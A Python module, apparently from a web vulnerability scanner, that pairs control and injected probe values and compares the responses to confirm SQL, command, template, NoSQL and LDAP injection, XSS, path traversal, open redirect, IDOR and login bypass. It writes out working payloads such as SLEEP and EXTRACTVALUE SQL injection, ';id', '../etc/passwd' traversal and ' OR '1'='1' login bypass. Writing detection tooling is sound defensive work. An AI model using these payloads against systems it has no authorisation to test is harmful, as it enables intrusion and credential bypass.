"""오라클 기반 확증 스캔 (differential probe-set confirmation).

단발 페이로드는 "터졌는지"를 우연과 구분하기 어렵다. 여기서는 파라미터 하나에
대해 '대조군 + 실험군'을 짝지어 소수의 프로브를 보내고, 응답 차이(시간/본문/반사)
로 취약 여부를 확증한다. sqlmap/Burp Intruder 가 하는 방식과 동일한 원리.

역할 분담:
  - 이 모듈 = 지식(프로브 목록 + 판정 오라클). HTTP 전송은 하지 않는다.
  - api.py = 전송 계층. probe_plan() 으로 보낼 값을 받아 대상 파라미터에 주입·전송
    하고, 각 응답을 dict 로 모아 decide() 에 넘긴다.

decide() 에 넘기는 results 항목 형식:
  {"role": str, "status": int, "time_ms": float, "body": str, "headers": dict, "value": str}
"""
from __future__ import annotations

import re
from typing import Optional

# ── 판정 임계값 ───────────────────────────────────────────────
_TIME_DELTA_MIN = 3500    # SLEEP(5) - SLEEP(0) 이 이 이상이면 시간 기반으로 인정(ms)
_TIME_CTRL_MAX  = 2500    # 단, 대조(SLEEP 0)가 이보다 느리면 회선 지연으로 보고 기각(ms)
_LEN_DELTA_MIN  = 40      # 본문 길이차가 이 이상이면 '유의미한 변화'(byte)

# XSS 반사 확인용 고유 마커(우연 반사와 구분)
_XSS_MARKER = "zqx7k"
_XSS_BREAK  = f'{_XSS_MARKER}"><svg onload=alert(1)>'

_PASSWD_RE = re.compile(r"root:.*?:0:0:", re.I)
_UID_RE    = re.compile(r"uid=\d+\([^)]+\)")

# 확증 프로브를 지원하는 카테고리
SUPPORTED = {"sqli", "ssti", "xss", "lfi", "cmdi", "redirect", "nosql", "idor", "business",
             "ldap", "auth"}

# 인증 실패를 가리키는 응답 키워드(대조군이 '실패'임을 확인하고, 우회 시 사라지는지 본다)
_AUTH_FAIL_RE = re.compile(
    r"invalid|incorrect|failed|failure|denied|wrong|not\s*found|unauthor|"
    r"틀렸|실패|올바르지|일치하지|다시\s*시도|로그인\s*(?:실패|하세요)", re.I)
# 세션/인증 쿠키 이름 힌트
_SESSION_COOKIE_RE = re.compile(r"(session|sess|auth|token|jwt|sid|login|connect\.sid)", re.I)

# 에러 기반 SQLi 확증용 고유 마커. EXTRACTVALUE 인자에 hex 로만 넣으므로, 응답에 '평문'
# 마커가 나오면 DB 가 hex 를 디코딩·평가해 에러 메시지로 되돌린 것 → error-based 확증.
# (요청에는 hex 만 있고 평문은 없으므로 우연 반사와 구분된다.)
_SQL_ERR_MARKER = "SQLIQZX7"
_SQL_ERR_HEX = _SQL_ERR_MARKER.encode().hex()   # 예: 53514c49515a5837
# 에러 기반이 마커 없이도 'DB 에러 유발' 로 잡히도록 하는 SQL 에러 시그니처.
# 대상 DB 를 미리 알 수 없으므로(=마커 payload 는 MySQL 전용) 주요 DBMS 의 에러 문구를
# 폭넓게 인식한다. 어느 DB든 주입된 따옴표로 쿼리가 깨지면 이 중 하나가 응답에 뜬다.
# (빈 대안 '||' 이 생기면 모든 문자열에 매칭되므로 절대 넣지 말 것 — 리스트 join 으로 방지)
_SQL_ERROR_RE = re.compile("|".join([
    # MySQL / MariaDB
    r"SQL syntax", r"You have an error in your SQL", r"mysql_fetch", r"MySQLSyntaxError",
    r"valid MySQL result", r"Warning.*\Wmysqli?_", r"XPATH syntax error",
    # PostgreSQL
    r"PostgreSQL.*ERROR", r"syntax error at or near", r"unterminated quoted string",
    r"invalid input syntax for", r"PG::\w+Error", r"org\.postgresql\.util\.PSQLException",
    # Microsoft SQL Server
    r"Microsoft SQL Server", r"Unclosed quotation mark",
    r"is not a recognized built-in function", r"Incorrect syntax near", r"SqlException",
    # Oracle
    r"ORA-\d{5}", r"quoted string not properly terminated", r"Oracle.*Driver", r"PLS-\d{5}",
    # SQLite
    r"sqlite3\.OperationalError", r"SQLite3::", r"unrecognized token",
    r'near ".+": syntax error',
    # 공통(드라이버/함수 없음/표준 SQLSTATE)
    r"ODBC.*Driver", r"SQLSTATE\[", r"function .{0,40} does not exist", r"DBD::\w+",
]), re.I)


# HTTP 메소드 확증에서 '위험'으로 보는 메소드
_DANGEROUS_HTTP_METHODS = {"PUT", "DELETE", "PATCH", "CONNECT", "TRACE",
                           "PROPFIND", "PROPPATCH", "MKCOL", "COPY", "MOVE",
                           "LOCK", "UNLOCK", "SEARCH"}


def decide_method(options_headers: Optional[dict], put_status, get_status,
                  get_body: str, marker: str, del_status=None) -> list[dict]:
    """메소드 프로브(OPTIONS 열거 + PUT→GET 되읽기) 결과를 확증 판정.
    techniques 는 '확증된' 항목만 담는다(모호한 경우는 프로브 표로 확인)."""
    techniques: list[dict] = []

    # OPTIONS — Allow/Public 헤더로 허용 메소드 열거, 위험 메소드 노출 확증
    allow = ""
    for k, v in (options_headers or {}).items():
        if str(k).lower() in ("allow", "public"):
            allow = (allow + "," + str(v)) if allow else str(v)
    if allow:
        methods = sorted({m.strip().upper() for m in allow.split(",") if m.strip()})
        dangerous = [m for m in methods if m in _DANGEROUS_HTTP_METHODS]
        if dangerous:
            techniques.append({
                "name": "위험 HTTP 메소드 노출 (OPTIONS)",
                "evidence": f"Allow: {', '.join(methods)} → 위험 메소드 {', '.join(dangerous)} 허용",
            })

    # PUT → GET 되읽기 — 업로드한 고유 마커가 그대로 돌아오면 '임의 파일 쓰기' 확증
    if put_status in (200, 201, 204) and get_status == 200 and marker and marker in (get_body or ""):
        ev = f"PUT {put_status} 후 GET 200 응답에 업로드 마커가 그대로 존재 → 서버에 파일이 실제로 기록됨(임의 파일 쓰기)"
        if del_status is not None:
            ev += f"; 정리 DELETE={del_status}"
        techniques.append({"name": "임의 파일 업로드 확증 (PUT→GET)", "evidence": ev})

    return techniques


def _norm_cat(category: str) -> str:
    """카테고리 별칭 정규화 — IDOR 페이로드는 'business' 카테고리로 들어온다."""
    c = (category or "").lower()
    return "idor" if c in ("idor", "business") else c


def is_supported(category: str) -> bool:
    return (category or "").lower() in SUPPORTED


# ── 프로브 목록 (순수 함수) ───────────────────────────────────
def probe_plan(category: str, base_value: str = "") -> list[dict]:
    """카테고리별로 대상 파라미터에 넣을 값 목록을 반환.

    role 이 'baseline' 인 항목이 대조군. 나머지는 오라클이 참조한다.
    'replace' 계열(lfi/xss 등)은 원래 값을 무시하고 페이로드로 통째 교체하고,
    'append' 계열(sqli/cmdi)은 유효한 기존 값 뒤에 브레이크 시퀀스를 붙인다.
    """
    b = base_value or ""
    cat = _norm_cat(category)

    if cat == "sqli":
        return [
            {"role": "baseline",   "label": "원본",            "value": b},
            {"role": "time0",      "label": "SLEEP(0) 문자열",  "value": f"{b}' AND SLEEP(0)-- -"},
            {"role": "time5",      "label": "SLEEP(5) 문자열",  "value": f"{b}' AND SLEEP(5)-- -"},
            {"role": "time0n",     "label": "SLEEP(0) 숫자",    "value": f"{b} AND SLEEP(0)-- -"},
            {"role": "time5n",     "label": "SLEEP(5) 숫자",    "value": f"{b} AND SLEEP(5)-- -"},
            {"role": "bool_true",  "label": "참 조건",          "value": f"{b}' AND '1'='1"},
            {"role": "bool_false", "label": "거짓 조건",        "value": f"{b}' AND '1'='2"},
            {"role": "err",  "label": "에러 기반(문자열)",
             "value": f"{b}' AND EXTRACTVALUE(1,CONCAT(0x7e,0x{_SQL_ERR_HEX},0x7e))-- -"},
            {"role": "errn", "label": "에러 기반(숫자)",
             "value": f"{b} AND EXTRACTVALUE(1,CONCAT(0x7e,0x{_SQL_ERR_HEX},0x7e))-- -"},
        ]

    if cat == "cmdi":
        return [
            {"role": "baseline", "label": "원본",         "value": b},
            {"role": "time0",    "label": "sleep 0",      "value": f"{b};sleep 0"},
            {"role": "time5",    "label": "sleep 5",      "value": f"{b};sleep 5"},
            {"role": "time5s",   "label": "$(sleep 5)",   "value": f"{b}$(sleep 5)"},
            {"role": "idcmd",    "label": "; id",         "value": f"{b};id"},
        ]

    if cat == "ssti":
        return [
            {"role": "baseline", "label": "원본",       "value": b},
            {"role": "e_curly",  "label": "{{7*7}}",    "value": f"{b}{{{{7*7}}}}"},
            {"role": "e_dollar", "label": "${7*7}",     "value": f"{b}${{7*7}}"},
        ]

    if cat == "xss":
        return [
            {"role": "baseline", "label": "원본",        "value": b},
            {"role": "probe",    "label": "반사 마커",   "value": _XSS_BREAK},
        ]

    if cat == "lfi":
        return [
            {"role": "baseline", "label": "원본",             "value": b},
            {"role": "trav1",    "label": "../../etc/passwd", "value": "../../../../../../etc/passwd"},
            {"role": "trav2",    "label": "인코딩 우회",      "value": "....//....//....//....//....//etc/passwd"},
        ]

    if cat == "redirect":
        return [
            {"role": "baseline", "label": "원본",       "value": b},
            {"role": "probe",    "label": "외부 도메인", "value": "//evil.example.com"},
        ]

    if cat == "nosql":
        # 불린 기반($where/문자열 보간) — 항상 참/거짓 조건의 응답 차이로 확증.
        return [
            {"role": "baseline", "label": "원본",              "value": b},
            {"role": "n_true",   "label": "항상 참(' || '1'=='1)", "value": f"{b}' || '1'=='1"},
            {"role": "n_false",  "label": "항상 거짓(' && '1'=='2)", "value": f"{b}' && '1'=='2"},
            {"role": "n_true2",  "label": '항상 참(" || "1"=="1)', "value": f'{b}" || "1"=="1'},
            {"role": "n_false2", "label": '항상 거짓(" && "1"=="2)', "value": f'{b}" && "1"=="2'},
        ]

    if cat == "idor":
        # 이웃 객체 ID 차등 — 숫자형 ID 만 ±1 열거로 확증 가능.
        s = b.strip()
        if not re.fullmatch(r"-?\d+", s):
            return []
        n = int(s)
        return [
            {"role": "baseline",    "label": "원본 ID",     "value": str(n)},
            {"role": "id_down",     "label": "이웃 ID(-1)", "value": str(n - 1)},
            {"role": "id_up",       "label": "이웃 ID(+1)", "value": str(n + 1)},
            {"role": "nonexistent", "label": "없는 ID",     "value": str(n + 10_000_000)},
        ]

    if cat == "ldap":
        # 불린 기반 — 와일드카드/필터 브레이크아웃의 참/거짓 응답 차이로 확증.
        return [
            {"role": "baseline", "label": "원본",                 "value": b},
            {"role": "l_wild",   "label": "와일드카드 * (참)",     "value": "*"},
            {"role": "l_none",   "label": "무매칭 값 (거짓)",      "value": f"{b}zzq_nomatch_9137"},
            {"role": "l_true",   "label": "필터 브레이크아웃(참)", "value": f"{b})(|(objectClass=*))"},
            {"role": "l_false",  "label": "필터 브레이크아웃(거짓)", "value": f"{b})(&(cn=zzq)(cn=xyz))"},
        ]

    if cat == "auth":
        # 인증 우회 — 대상 파라미터(보통 username)에 우회 페이로드를 넣고, 실패 대조군과
        # 비교해 인증 성공 신호(세션 쿠키·리다이렉트·상태 개선·실패문구 소멸)를 확인한다.
        # 나머지 필드(password 등)는 요청 폼 값 그대로(더미) 사용한다.
        return [
            {"role": "baseline", "label": "오답(대조)",          "value": "zzq_invalid_9137"},
            {"role": "byp_sql",  "label": "' OR '1'='1'-- -",    "value": "' OR '1'='1'-- -"},
            {"role": "byp_sql2", "label": "admin'-- -",          "value": "admin'-- -"},
            {"role": "byp_or",   "label": "' OR 1=1#",           "value": "' OR 1=1#"},
            {"role": "byp_ldap", "label": "*)(uid=*)",           "value": "*)(uid=*))(|(uid=*"},
        ]

    return []


# ── 오라클 (순수 함수) ────────────────────────────────────────
def _loc_header(headers: dict) -> str:
    for k, v in (headers or {}).items():
        if k.lower() == "location":
            return str(v)
    return ""


def _has_session_cookie(headers: dict) -> bool:
    """응답 Set-Cookie 에 세션/인증성 쿠키가 있으면 True."""
    for k, v in (headers or {}).items():
        if k.lower() == "set-cookie" and _SESSION_COOKIE_RE.search(str(v)):
            return True
    return False


def decide(category: str, results: list[dict]) -> dict:
    """프로브 응답들을 비교해 확증 여부를 판정.

    반환: {"confirmed": bool, "techniques": [{"name","evidence"}], "category": str}
    techniques 가 비어 있으면 '깨끗'(확증 실패).
    """
    cat = _norm_cat(category)
    by = {r["role"]: r for r in results}
    techniques: list[dict] = []

    def ok(role: str) -> bool:
        r = by.get(role)
        return bool(r) and int(r.get("status") or 0) > 0

    if cat == "sqli":
        # 시간 기반 — 문자열/숫자 컨텍스트 각각
        for c0, c5, ctx in (("time0", "time5", "문자열"), ("time0n", "time5n", "숫자")):
            if ok(c0) and ok(c5):
                t0, t5 = by[c0]["time_ms"], by[c5]["time_ms"]
                if t0 < _TIME_CTRL_MAX and (t5 - t0) >= _TIME_DELTA_MIN:
                    techniques.append({
                        "name": f"시간 기반 SQLi ({ctx} 컨텍스트)",
                        "evidence": f"SLEEP(5)={t5:.0f}ms vs SLEEP(0)={t0:.0f}ms (Δ{t5 - t0:.0f}ms)",
                    })
        # 불린 기반 — 참/거짓 응답이 갈리는가
        if ok("baseline") and ok("bool_true") and ok("bool_false"):
            bt, bf = by["bool_true"], by["bool_false"]
            status_diff = bt["status"] != bf["status"]
            len_diff = abs(len(bt.get("body") or "") - len(bf.get("body") or ""))
            if status_diff or len_diff >= _LEN_DELTA_MIN:
                ev = []
                if status_diff:
                    ev.append(f"상태 참={bt['status']}/거짓={bf['status']}")
                if len_diff >= _LEN_DELTA_MIN:
                    ev.append(f"본문 길이차 {len_diff}B")
                techniques.append({"name": "불린 기반 SQLi", "evidence": "; ".join(ev)})
        # 에러 기반 — EXTRACTVALUE 로 hex 마커를 되돌리게 하고, 응답에 '평문' 마커가 나오면
        # DB 가 실제로 평가한 것(요청엔 hex 만 있음). 또는 대조엔 없던 SQL 에러가 뜨면 확증.
        base_body = (by.get("baseline") or {}).get("body") or ""
        base_has_err = bool(_SQL_ERROR_RE.search(base_body))
        for role in ("err", "errn"):
            r = by.get(role)
            body = (r or {}).get("body") or ""
            if not r:
                continue
            if _SQL_ERR_MARKER in body:
                techniques.append({
                    "name": "에러 기반 SQLi (마커 반환)",
                    "evidence": f"주입한 hex(0x{_SQL_ERR_HEX})가 DB 에러로 '{_SQL_ERR_MARKER}' 평문 반환",
                })
                break
            if not base_has_err and _SQL_ERROR_RE.search(body):
                m = _SQL_ERROR_RE.search(body)
                techniques.append({
                    "name": "에러 기반 SQLi (DB 에러 유발)",
                    "evidence": f"대조엔 없던 SQL 에러가 주입 시 발생: '{m.group(0)[:60]}'",
                })
                break

    elif cat == "cmdi":
        for c0, c5, ctx in (("time0", "time5", "; sleep"), ("time0", "time5s", "$(sleep)")):
            if ok(c0) and ok(c5):
                t0, t5 = by[c0]["time_ms"], by[c5]["time_ms"]
                if t0 < _TIME_CTRL_MAX and (t5 - t0) >= _TIME_DELTA_MIN:
                    techniques.append({
                        "name": f"명령 주입 (시간 기반, {ctx})",
                        "evidence": f"sleep5={t5:.0f}ms vs sleep0={t0:.0f}ms (Δ{t5 - t0:.0f}ms)",
                    })
        r = by.get("idcmd")
        if r and _UID_RE.search(r.get("body") or ""):
            m = _UID_RE.search(r["body"])
            techniques.append({"name": "명령 주입 (id 실행)", "evidence": f"응답에 '{m.group(0)}' 등장"})

    elif cat == "ssti":
        for role in ("e_curly", "e_dollar"):
            r = by.get(role)
            body = (r or {}).get("body") or ""
            # 49 가 '7*7' 원문이 아니라 계산 결과로 등장해야 함
            if r and "49" in body and "7*7" not in body:
                techniques.append({
                    "name": "SSTI (서버 템플릿 평가)",
                    "evidence": "표현식이 서버에서 계산됨 — 응답에 '49' 등장",
                })
                break

    elif cat == "xss":
        r = by.get("probe")
        body = (r or {}).get("body") or ""
        # 마커 브레이크가 '인코딩 없이' 그대로 반사되면 실행 가능
        if r and _XSS_BREAK in body:
            techniques.append({
                "name": "반사형 XSS (미인코딩 반사)",
                "evidence": f"주입한 '{_XSS_MARKER}\"><svg …>' 가 원문 그대로 반사됨",
            })

    elif cat == "lfi":
        for role in ("trav1", "trav2"):
            r = by.get(role)
            m = _PASSWD_RE.search((r or {}).get("body") or "")
            if r and m:
                techniques.append({
                    "name": "로컬 파일 읽기 (LFI)",
                    "evidence": f"응답에 /etc/passwd 내용 '{m.group(0)}' 노출",
                })
                break

    elif cat == "redirect":
        r = by.get("probe")
        loc = _loc_header((r or {}).get("headers") or {})
        if r and ("evil.example.com" in loc):
            techniques.append({
                "name": "오픈 리다이렉트",
                "evidence": f"Location 헤더가 외부로 이동: {loc[:100]}",
            })

    elif cat == "nosql":
        # 불린 기반 — 항상 참/거짓 응답이 유의미하게 갈리면 확증(SQLi 불린과 동일 원리).
        for t, f, ctx in (("n_true", "n_false", "작은따옴표"), ("n_true2", "n_false2", "큰따옴표")):
            if ok(t) and ok(f):
                rt, rf = by[t], by[f]
                status_diff = rt["status"] != rf["status"]
                len_diff = abs(len(rt.get("body") or "") - len(rf.get("body") or ""))
                if status_diff or len_diff >= _LEN_DELTA_MIN:
                    ev = []
                    if status_diff:
                        ev.append(f"상태 참={rt['status']}/거짓={rf['status']}")
                    if len_diff >= _LEN_DELTA_MIN:
                        ev.append(f"본문 길이차 {len_diff}B")
                    techniques.append({
                        "name": f"NoSQL 불린 기반 ({ctx} 컨텍스트)",
                        "evidence": "; ".join(ev),
                    })

    elif cat == "idor":
        # 이웃 객체 ID 차등 — 원본 ID 는 실제 객체(200·본문 O), 없는 ID 는 실패(대조),
        # 이웃 ID 가 200·'다른' 실제 객체를 주면 소유권 검사 없이 임의 접근 → IDOR.
        base = by.get("baseline")
        b_body = (base or {}).get("body") or ""
        b_len = len(b_body)
        if base and int(base.get("status") or 0) == 200 and b_len >= 30:
            ne = by.get("nonexistent")
            ne_body = (ne or {}).get("body") or ""
            ne_negative = bool(ne) and (
                int(ne.get("status") or 0) != 200 or len(ne_body) < max(30, 0.3 * b_len)
            )
            if ne_negative:  # 대조군이 '실패'해야 열거 신호를 신뢰할 수 있다
                for role, lbl in (("id_down", "-1"), ("id_up", "+1")):
                    r = by.get(role)
                    nb = (r or {}).get("body") or ""
                    if r and int(r.get("status") or 0) == 200 and nb and nb != b_body and len(nb) >= 0.5 * b_len:
                        techniques.append({
                            "name": "IDOR (직접 객체 참조)",
                            "evidence": f"이웃 ID({lbl})가 200·다른 객체 반환, 없는 ID 는 실패 "
                                        f"({int(ne.get('status') or 0)}) → 소유권 검사 없음",
                        })
                        break

    elif cat == "ldap":
        # 불린 기반 — 참/거짓 쌍의 응답이 유의미하게 갈리면 확증(SQLi/NoSQL 불린과 동일).
        for t, f, ctx in (("l_wild", "l_none", "와일드카드"), ("l_true", "l_false", "필터 브레이크아웃")):
            if ok(t) and ok(f):
                rt, rf = by[t], by[f]
                status_diff = rt["status"] != rf["status"]
                len_diff = abs(len(rt.get("body") or "") - len(rf.get("body") or ""))
                if status_diff or len_diff >= _LEN_DELTA_MIN:
                    ev = []
                    if status_diff:
                        ev.append(f"상태 참={rt['status']}/거짓={rf['status']}")
                    if len_diff >= _LEN_DELTA_MIN:
                        ev.append(f"본문 길이차 {len_diff}B")
                    techniques.append({
                        "name": f"LDAP 불린 기반 ({ctx})",
                        "evidence": "; ".join(ev),
                    })

    elif cat == "auth":
        # 인증 우회 — 실패 대조군(baseline) 대비, 우회 payload 가 '인증 성공' 신호를 보이면 확증.
        c = by.get("baseline")
        if c and int(c.get("status") or 0) > 0:
            c_status = int(c.get("status") or 0)
            c_body = c.get("body") or ""
            c_sess = _has_session_cookie(c.get("headers") or {})
            c_fail = bool(_AUTH_FAIL_RE.search(c_body))
            c_redir = c_status in (301, 302, 303, 307, 308)
            for role in ("byp_sql", "byp_sql2", "byp_or", "byp_ldap"):
                r = by.get(role)
                if not (r and int(r.get("status") or 0) > 0):
                    continue
                b_status = int(r.get("status") or 0)
                b_body = r.get("body") or ""
                signals = []
                # ① 세션 쿠키 획득(대조군엔 없던)
                if _has_session_cookie(r.get("headers") or {}) and not c_sess:
                    signals.append("세션 쿠키 발급")
                # ② 로그인 성공 리다이렉트(대조군은 리다이렉트 아님)
                if b_status in (301, 302, 303, 307, 308) and not c_redir:
                    signals.append(f"성공 리다이렉트({b_status})")
                # ③ 상태 개선(대조 401/403 → 우회 200/302)
                if c_status in (401, 403) and b_status in (200, 301, 302, 303, 307, 308):
                    signals.append(f"상태 {c_status}→{b_status}")
                # ④ 실패 문구 소멸(대조엔 있고 우회엔 없음, 200 응답)
                if c_fail and b_status == 200 and not _AUTH_FAIL_RE.search(b_body):
                    signals.append("인증 실패 문구 사라짐")
                if signals:
                    techniques.append({
                        "name": "인증 우회",
                        "evidence": f"'{r.get('value')}' → " + ", ".join(signals),
                    })
                    break

    return {"confirmed": bool(techniques), "techniques": techniques, "category": cat}
